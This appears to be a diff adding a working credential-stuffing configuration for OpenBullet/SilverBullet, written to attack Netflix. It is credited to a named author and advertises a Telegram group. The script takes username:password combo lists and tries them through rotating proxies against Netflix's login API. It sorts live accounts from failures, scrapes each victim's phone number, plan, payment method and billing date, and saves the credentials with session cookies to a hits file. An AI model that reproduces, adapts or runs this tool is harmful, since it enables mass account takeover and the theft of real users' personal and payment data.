@@ -1,0 +1,498 @@
+[SETTINGS]
+{
+  "Name": "NFLIX3",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2026-02-10T20:37:49.6065188+04:00",
+  "AdditionalInfo": "Join Telegram War Room--> https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT",
+  "RequiredPlugins": [],
+  "Author": "🔥 @therealyashvirgaming 🔥",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "Default",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join US On Telegram --> https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT",
+      "VariableName": "",
+      "Id": 692187226
+    },
+    {
+      "Description": "Join US On Telegram - https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT",
+      "VariableName": "",
+      "Id": 2077914091
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "NFLIX3",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+!#ADS FUNCTION Constant "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT" -> VAR "Join US On Telegram " 
+
+#USER-AGENT FUNCTION GetRandomUA BROWSER IOS -> VAR "jeremygamster" 
+
+#GEO_LOCATION REQUEST GET "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location" 
+  
+  HEADER "Host: geolocation.onetrust.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0" 
+  HEADER "accept: application/json" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"142\", \"Opera\";v=\"126\", \"Not_A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.netflix.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#country1 PARSE "<SOURCE>" LR "\"country\":\"" "\"," -> VAR "country1" 
+
+#count_lower FUNCTION ToUppercase "<country1>" -> VAR "count_lower" 
+
+#enBIG FUNCTION Constant "en-<country1>" -> VAR "enBIG" 
+
+#eN FUNCTION Constant "en-<count_lower>" -> VAR "eN" 
+
+#Code FUNCTION Translate 
+  KEY "AF" VALUE "93" 
+  KEY "AL" VALUE "355" 
+  KEY "DZ" VALUE "213" 
+  KEY "AS" VALUE "1684" 
+  KEY "AD" VALUE "376" 
+  KEY "AO" VALUE "244" 
+  KEY "AI" VALUE "1264" 
+  KEY "AQ" VALUE "N/A" 
+  KEY "AG" VALUE "1268" 
+  KEY "AR" VALUE "54" 
+  KEY "AM" VALUE "374" 
+  KEY "AW" VALUE "297" 
+  KEY "AU" VALUE "61" 
+  KEY "AT" VALUE "43" 
+  KEY "AZ" VALUE "994" 
+  KEY "BS" VALUE "1242" 
+  KEY "BH" VALUE "973" 
+  KEY "BD" VALUE "880" 
+  KEY "BB" VALUE "1246" 
+  KEY "BY" VALUE "375" 
+  KEY "BE" VALUE "32" 
+  KEY "BZ" VALUE "501" 
+  KEY "BJ" VALUE "229" 
+  KEY "BM" VALUE "1441" 
+  KEY "BT" VALUE "975" 
+  KEY "BO" VALUE "591" 
+  KEY "BA" VALUE "387" 
+  KEY "BW" VALUE "267" 
+  KEY "BV" VALUE "N/A" 
+  KEY "BR" VALUE "55" 
+  KEY "IO" VALUE "246" 
+  KEY "BN" VALUE "673" 
+  KEY "BG" VALUE "359" 
+  KEY "BF" VALUE "226" 
+  KEY "BI" VALUE "257" 
+  KEY "KH" VALUE "855" 
+  KEY "CM" VALUE "237" 
+  KEY "CA" VALUE "1" 
+  KEY "CV" VALUE "238" 
+  KEY "KY" VALUE "1345" 
+  KEY "CF" VALUE "236" 
+  KEY "TD" VALUE "235" 
+  KEY "CL" VALUE "56" 
+  KEY "CN" VALUE "86" 
+  KEY "CX" VALUE "61" 
+  KEY "CC" VALUE "61" 
+  KEY "CO" VALUE "57" 
+  KEY "KM" VALUE "269" 
+  KEY "CG" VALUE "242" 
+  KEY "CK" VALUE "682" 
+  KEY "CR" VALUE "506" 
+  KEY "CI" VALUE "225" 
+  KEY "HR" VALUE "385" 
+  KEY "CU" VALUE "53" 
+  KEY "CY" VALUE "357" 
+  KEY "CZ" VALUE "420" 
+  KEY "DK" VALUE "45" 
+  KEY "DJ" VALUE "253" 
+  KEY "DM" VALUE "1767" 
+  KEY "DO" VALUE "1809" 
+  KEY "EC" VALUE "593" 
+  KEY "EG" VALUE "20" 
+  KEY "SV" VALUE "503" 
+  KEY "GQ" VALUE "240" 
+  KEY "ER" VALUE "291" 
+  KEY "EE" VALUE "372" 
+  KEY "ET" VALUE "251" 
+  KEY "FK" VALUE "500" 
+  KEY "FO" VALUE "298" 
+  KEY "FJ" VALUE "679" 
+  KEY "FI" VALUE "358" 
+  KEY "FR" VALUE "33" 
+  KEY "GF" VALUE "594" 
+  KEY "PF" VALUE "689" 
+  KEY "TF" VALUE "N/A" 
+  KEY "GA" VALUE "241" 
+  KEY "GM" VALUE "220" 
+  KEY "GE" VALUE "995" 
+  KEY "DE" VALUE "49" 
+  KEY "GH" VALUE "233" 
+  KEY "GI" VALUE "350" 
+  KEY "GR" VALUE "30" 
+  KEY "GL" VALUE "299" 
+  KEY "GD" VALUE "1473" 
+  KEY "GP" VALUE "590" 
+  KEY "GU" VALUE "1671" 
+  KEY "GT" VALUE "502" 
+  KEY "GN" VALUE "224" 
+  KEY "GW" VALUE "245" 
+  KEY "GY" VALUE "592" 
+  KEY "HT" VALUE "509" 
+  KEY "HM" VALUE "N/A" 
+  KEY "HN" VALUE "504" 
+  KEY "HK" VALUE "852" 
+  KEY "HU" VALUE "36" 
+  KEY "IS" VALUE "354" 
+  KEY "IN" VALUE "91" 
+  KEY "ID" VALUE "62" 
+  KEY "IR" VALUE "98" 
+  KEY "IQ" VALUE "964" 
+  KEY "IE" VALUE "353" 
+  KEY "IL" VALUE "972" 
+  KEY "IT" VALUE "39" 
+  KEY "JM" VALUE "1876" 
+  KEY "JP" VALUE "81" 
+  KEY "JO" VALUE "962" 
+  KEY "KZ" VALUE "7" 
+  KEY "KE" VALUE "254" 
+  KEY "KI" VALUE "686" 
+  KEY "KR" VALUE "82" 
+  KEY "KP" VALUE "850" 
+  KEY "KW" VALUE "965" 
+  KEY "KG" VALUE "996" 
+  KEY "LA" VALUE "856" 
+  KEY "LV" VALUE "371" 
+  KEY "LB" VALUE "961" 
+  KEY "LS" VALUE "266" 
+  KEY "LR" VALUE "231" 
+  KEY "LY" VALUE "218" 
+  KEY "LI" VALUE "423" 
+  KEY "LT" VALUE "370" 
+  KEY "LU" VALUE "352" 
+  KEY "MO" VALUE "853" 
+  KEY "MK" VALUE "389" 
+  KEY "MG" VALUE "261" 
+  KEY "MW" VALUE "265" 
+  KEY "MY" VALUE "60" 
+  KEY "MV" VALUE "960" 
+  KEY "ML" VALUE "223" 
+  KEY "MT" VALUE "356" 
+  KEY "MH" VALUE "692" 
+  KEY "MQ" VALUE "596" 
+  KEY "MR" VALUE "222" 
+  KEY "MU" VALUE "230" 
+  KEY "YT" VALUE "262" 
+  KEY "MX" VALUE "52" 
+  KEY "FM" VALUE "691" 
+  KEY "MD" VALUE "373" 
+  KEY "MC" VALUE "377" 
+  KEY "MN" VALUE "976" 
+  KEY "ME" VALUE "382" 
+  KEY "MS" VALUE "1664" 
+  KEY "MA" VALUE "212" 
+  KEY "MZ" VALUE "258" 
+  KEY "MM" VALUE "95" 
+  KEY "NA" VALUE "264" 
+  KEY "NR" VALUE "674" 
+  KEY "NP" VALUE "977" 
+  KEY "NL" VALUE "31" 
+  KEY "NC" VALUE "687" 
+  KEY "NZ" VALUE "64" 
+  KEY "NI" VALUE "505" 
+  KEY "NE" VALUE "227" 
+  KEY "NG" VALUE "234" 
+  KEY "NU" VALUE "683" 
+  KEY "NF" VALUE "672" 
+  KEY "MP" VALUE "1670" 
+  KEY "NO" VALUE "47" 
+  KEY "OM" VALUE "968" 
+  KEY "PK" VALUE "92" 
+  KEY "PW" VALUE "680" 
+  KEY "PA" VALUE "507" 
+  KEY "PG" VALUE "675" 
+  KEY "PY" VALUE "595" 
+  KEY "PE" VALUE "51" 
+  KEY "PH" VALUE "63" 
+  KEY "PN" VALUE "64" 
+  KEY "PL" VALUE "48" 
+  KEY "PT" VALUE "351" 
+  KEY "PR" VALUE "1787" 
+  KEY "QA" VALUE "974" 
+  KEY "RE" VALUE "262" 
+  KEY "RO" VALUE "40" 
+  KEY "RU" VALUE "7" 
+  KEY "RW" VALUE "250" 
+  KEY "SH" VALUE "290" 
+  KEY "KN" VALUE "1869" 
+  KEY "LC" VALUE "1758" 
+  KEY "PM" VALUE "508" 
+  KEY "VC" VALUE "1784" 
+  KEY "WS" VALUE "685" 
+  KEY "SM" VALUE "378" 
+  KEY "ST" VALUE "239" 
+  KEY "SA" VALUE "966" 
+  KEY "SN" VALUE "221" 
+  KEY "RS" VALUE "381" 
+  KEY "SC" VALUE "248" 
+  KEY "SL" VALUE "232" 
+  KEY "SG" VALUE "65" 
+  KEY "SK" VALUE "421" 
+  KEY "SI" VALUE "386" 
+  KEY "SB" VALUE "677" 
+  KEY "SO" VALUE "252" 
+  KEY "ZA" VALUE "27" 
+  KEY "GS" VALUE "N/A" 
+  KEY "ES" VALUE "34" 
+  KEY "LK" VALUE "94" 
+  KEY "SD" VALUE "249" 
+  KEY "SR" VALUE "597" 
+  KEY "SJ" VALUE "47" 
+  KEY "SZ" VALUE "268" 
+  KEY "SE" VALUE "46" 
+  KEY "CH" VALUE "41" 
+  KEY "SY" VALUE "963" 
+  KEY "TW" VALUE "886" 
+  KEY "TJ" VALUE "992" 
+  KEY "TZ" VALUE "255" 
+  KEY "TH" VALUE "66" 
+  KEY "TG" VALUE "228" 
+  KEY "TK" VALUE "690" 
+  KEY "TO" VALUE "676" 
+  KEY "TT" VALUE "1868" 
+  KEY "TN" VALUE "216" 
+  KEY "TR" VALUE "90" 
+  KEY "TM" VALUE "993" 
+  KEY "TC" VALUE "1649" 
+  KEY "TV" VALUE "688" 
+  KEY "UG" VALUE "256" 
+  KEY "UA" VALUE "380" 
+  KEY "AE" VALUE "971" 
+  KEY "GB" VALUE "44" 
+  KEY "US" VALUE "1" 
+  KEY "UY" VALUE "598" 
+  KEY "UZ" VALUE "998" 
+  KEY "VU" VALUE "678" 
+  KEY "VA" VALUE "39" 
+  KEY "VE" VALUE "58" 
+  KEY "VN" VALUE "84" 
+  KEY "VG" VALUE "1284" 
+  KEY "VI" VALUE "1340" 
+  KEY "WF" VALUE "681" 
+  KEY "YE" VALUE "967" 
+  KEY "ZM" VALUE "260" 
+  KEY "ZW" VALUE "263" 
+  "<country1>" -> VAR "Code" 
+
+!#ADS FUNCTION Constant "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT" -> VAR "Join US On Telegram " 
+
+#REQUEST_GET REQUEST GET "https://www.netflix.com/<count_lower>/login" 
+  
+  HEADER "Host: www.netflix.com" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "Priority: u=0, i" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#flwssn PARSE "<COOKIES(flwssn)>" LR "" "" -> VAR "flwssn" 
+
+#nfvdid PARSE "<COOKIES(nfvdid)>" LR "" "" -> VAR "nfvdid" 
+
+#SecureNetflixId PARSE "<COOKIES(SecureNetflixId)>" LR "" "" -> VAR "SecureNetflixId" 
+
+#gsid PARSE "<COOKIES(gsid)>" LR "" "" -> VAR "gsid" 
+
+#uiVersion PARSE "<SOURCE>" LR "{\"X-Netflix.uiVersion\":\"" "\"," -> VAR "uiVersion" 
+
+#clientType PARSE "<SOURCE>" LR "\"X-Netflix.clientType\":\"" "\"}}}" -> VAR "clientType" 
+
+#preferredLocale PARSE "<SOURCE>" LR "\"preferredLocale\":{\"id\":\"" "\"," -> VAR "preferredLocale" 
+
+#clcsSessionId PARSE "<SOURCE>" LR "\\\"clcsSessionId\\\":\\\"" "\"," -> VAR "clcsSessionId" 
+
+#referrerRenditionId PARSE "<SOURCE>" LR "\\\"referrerRenditionId\\\":\\\"" "\"}" -> VAR "referrerRenditionId" 
+
+#hellfireSessionId PARSE "<SOURCE>" LR "\\\"hellfireSessionId\\\":\\\"" "\"}" -> VAR "hellfireSessionId" 
+
+!#ADS FUNCTION Constant "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT" -> VAR "Join US On Telegram " 
+
+#LOGIN_WEB REQUEST POST "https://web.prod.cloud.netflix.com/graphql" 
+  CONTENT "{\"operationName\":\"CLCSScreenUpdate\",\"variables\":{\"format\":\"HTML\",\"imageFormat\":\"PNG\",\"locale\":\"<preferredLocale>\",\"serverState\":\"{\\\"realm\\\":\\\"growth\\\",\\\"name\\\":\\\"PASSWORD_LOGIN\\\",\\\"clcsSessionId\\\":\\\"<clcsSessionId>\",\\\"sessionContext\\\":{\\\"session-breadcrumbs\\\":{\\\"funnel_name\\\":\\\"loginWeb\\\"},\\\"emailRegisterLinkSent.manageResendToast\\\":{\\\"showToast\\\":false},\\\"login.navigationSettings\\\":{\\\"hideOtpToggle\\\":true}}}\",\"serverScreenUpdate\":\"{\\\"realm\\\":\\\"custom\\\",\\\"name\\\":\\\"growthLoginByPassword\\\",\\\"metadata\\\":{\\\"recaptchaSiteKey\\\":\\\"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR\\\"},\\\"loggingAction\\\":\\\"Submitted\\\",\\\"loggingCommand\\\":\\\"SubmitCommand\\\",\\\"referrerRenditionId\\\":\\\"<referrerRenditionId>\"}\",\"inputFields\":[{\"name\":\"password\",\"value\":{\"stringValue\":\"<PASS>\"}},{\"name\":\"userLoginId\",\"value\":{\"stringValue\":\"<USER>\"}},{\"name\":\"countryCode\",\"value\":{\"stringValue\":\"<Code>\"}},{\"name\":\"countryIsoCode\",\"value\":{\"stringValue\":\"<country1>\"}},{\"name\":\"recaptchaResponseTime\",\"value\":{\"intValue\":422}},{\"name\":\"recaptchaResponseToken\",\"value\":{\"stringValue\":\"\"}}]},\"extensions\":{\"persistedQuery\":{\"id\":\"99afa95c-aa4e-4a8a-aecd-19ed486822af\",\"version\":102}}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: web.prod.cloud.netflix.com" 
+  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 750" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Referer: https://www.netflix.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: <jeremygamster>" 
+  HEADER "accept: */*" 
+  HEADER "accept-language: <eNBIG>" 
+  HEADER "content-type: application/json" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"142\", \"Opera\";v=\"126\", \"Not_A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "x-netflix.context.app-version: <uiVersion>" 
+  HEADER "x-netflix.context.hawkins-version: 5.12.1" 
+  HEADER "x-netflix.context.locales: <eN>" 
+  HEADER "x-netflix.context.operation-name: CLCSScreenUpdate" 
+  HEADER "x-netflix.context.ui-flavor: <clientType>" 
+  HEADER "x-netflix.request.attempt: 1" 
+  HEADER "x-netflix.request.clcs.bucket: high" 
+  HEADER "x-netflix.request.client.context: {\"appstate\":\"foreground\"}" 
+  HEADER "x-netflix.request.id: 097c8cd0168845b4b4aacda7b0068223" 
+  HEADER "x-netflix.request.toplevel.uuid: 04406198-38f4-4c47-8e1d-86b70cf89080" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect password. You can get a rejoin link" 
+    KEY "Incorrect password. You can get a rejoin link, or check your info and try again." 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Welcome back," 
+    KEY "PLAN_SELECTION_CONTEXT" 
+    KEY "PLAN_SELECTION" 
+    KEY "\"growth\\\",\\\"name\\\":\\\"PLAN_SELECTION\\\",\\\"clcsSessionId\\\":\\\"7db31ce3-70a4-4c5e-b792-2bd3d08992d8\\\",\\\"sessionContext\\\":{\\\"session-br" 
+  KEYCHAIN Success OR 
+    KEY "Navigating to /browse\\" 
+    KEY "\"universal\":\"/browse" 
+  KEYCHAIN Retry OR 
+    KEY "PERMISSION_DENIED" 
+    KEY "Access is denied for passport" 
+
+#Cookie2 PARSE "<COOKIES(NetflixId)>" LR "" "" -> VAR "Cookie2" 
+
+!#ADS FUNCTION Constant "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT" -> VAR "Join US On Telegram " 
+
+#NETFLIX_ACCOUNT REQUEST GET "https://www.netflix.com/account" 
+  
+  HEADER "Host: www.netflix.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"142\", \"Opera\";v=\"126\", \"Not_A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-ch-ua-platform-version: \"19.0.0\"" 
+  HEADER "sec-ch-ua-model: \"\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#profileInfo PARSE "<SOURCE>" LR "\"profileInfo\":{\"profileName\":\"" "\"" -> VAR "profileInfo" 
+
+#profileName FUNCTION Replace "\\x20" " " "<profileInfo>" -> CAP "profileName" 
+
+#phoneNumberDigits PARSE "<SOURCE>" LR "\"phoneNumberDigits\":{\"__typename\":\"GrowthClearStringValue\",\"value\":\"" "\"}" -> VAR "phoneNumberDigits" 
+
+#phoneNumber FUNCTION Unescape "<phoneNumberDigits>" -> CAP "phoneNumber" 
+
+PARSE "<SOURCE>" LR "\"memberSince\":{\"fieldType\":\"Numeric\",\"value\":" "}" -> VAR "memberSince" 
+
+#memberSince FUNCTION UnixTimeToDate "yyyy-MM-dd" "<memberSince>" -> CAP "memberSince" 
+
+#Country PARSE "<SOURCE>" LR "\"currentCountry\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#PlanName PARSE "<SOURCE>" LR "\"localizedPlanName\":{\"fieldType\":\"String\",\"value\":\"" "\"}" CreateEmpty=FALSE -> CAP "PlanName" 
+
+#maxStreams PARSE "<SOURCE>" LR "\"maxStreams\":{\"fieldType\":\"Numeric\",\"value\":" "}" CreateEmpty=FALSE -> CAP "maxStreams" 
+
+#videoQuality PARSE "<SOURCE>" LR "\"videoQuality\":{\"fieldType\":\"String\",\"value\":\"" "\"}" CreateEmpty=FALSE -> CAP "videoQuality" 
+
+PARSE "<SOURCE>" LR "\"planPrice\":{\"fieldType\":\"String\",\"value\":\"" "\"}" -> VAR "planPrice" 
+
+#planPrice FUNCTION Unescape "<planPrice>" -> CAP "planPrice" 
+
+#paymentMethod PARSE "<SOURCE>" LR "\"paymentMethod\":{\"fieldType\":\"String\",\"value\":\"" "\"}" CreateEmpty=FALSE -> CAP "paymentMethod" 
+
+PARSE "<SOURCE>" LR "\"nextBillingDate\":{\"fieldType\":\"String\",\"value\":\"" "\"}" -> VAR "nextBillingDate" 
+
+#nextBillingDate FUNCTION Replace "\\x20" "-" "<nextBillingDate>" -> CAP "nextBillingDate" 
+
+#ExtraMember PARSE "<SOURCE>" LR "\"showExtraMemberSection\":{\"fieldType\":\"Boolean\",\"value\":" "}" CreateEmpty=FALSE -> CAP "ExtraMember" 
+
+#AUTHOR FUNCTION Constant "🔥 @therealyashvirgaming 🔥" -> CAP "Config By " 
+
+!#ADS FUNCTION Constant "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT" -> VAR "Join US On Telegram " 
+
+#Netflix_Cookie PARSE "<Cookie2>" LR "" "" CreateEmpty=FALSE -> CAP "Netflix Cookie" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER" 
+    KEY "\"CURRENT_MEMBER\":true," 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER" 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER" 
+    KEY "\"ANONYMOUS\":true," 
+    KEY "\"FORMER_MEMBER\":true," 
+
+#SAVE_COOKIE UTILITY File "Netflix/Hits_Cookies.txt" AppendLines "\\nCredentials: <USER>:<PASS>\\nprofileName: <profileName>\\nmemberSince: <memberSince>\\nphoneNumber: <phoneNumber>\\nCountry: <Country>\\nPlanName: <PlanName>\\nScreens: <maxStreams>\\nvideoQuality: <videoQuality>\\nplanPrice: <planPrice>\\npaymentMethod: <paymentMethod>\\nnextBillingDate: <nextBillingDate>\\nExtraMember: <ExtraMember>\\nConfig By 🔥 @therealyashvirgaming 🔥\\nJoin Telegram: https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT\\nNetflix Login Cookie: <Netflix Cookie>\\n" -> VAR "SAVE_COOKIE" 
+
+!#ADS FUNCTION Constant "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT" -> VAR "Join US On Telegram " 
+
